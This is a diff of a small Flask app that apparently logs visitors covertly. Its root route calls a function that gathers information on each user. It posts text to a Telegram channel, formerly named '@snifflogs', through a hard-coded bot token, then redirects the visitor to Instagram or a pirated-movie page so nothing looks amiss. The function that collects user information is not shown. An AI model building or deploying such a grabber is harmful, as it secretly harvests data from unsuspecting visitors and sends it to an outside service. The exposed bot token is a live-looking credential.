@@ -12,7 +12,7 @@ def send_to_channel(text: str = None):
     :type text: str
     """
     data = {
-        "chat_id": "@snifflogs",
+        "chat_id": "@dsf",
         "text": text
     }
     url = "https://api.telegram.org/bot598340268:AAG5LAPOcWOqEUXcSPjfXBJ4CXDY0hHDR3Y/sendMessage?"
@@ -28,8 +28,9 @@ def send_user_info():
 @app.route('/', methods=['GET'])
 def crib_form():
     send_user_info()
-    return redirect("https://www.instagram.com")
+    return redirect("http://kinogo.cc/7780-chelovek-pauk-cherez-vselennye-2018-v4.html")
 
 
 if __name__ == '__main__':
     app.run()
+
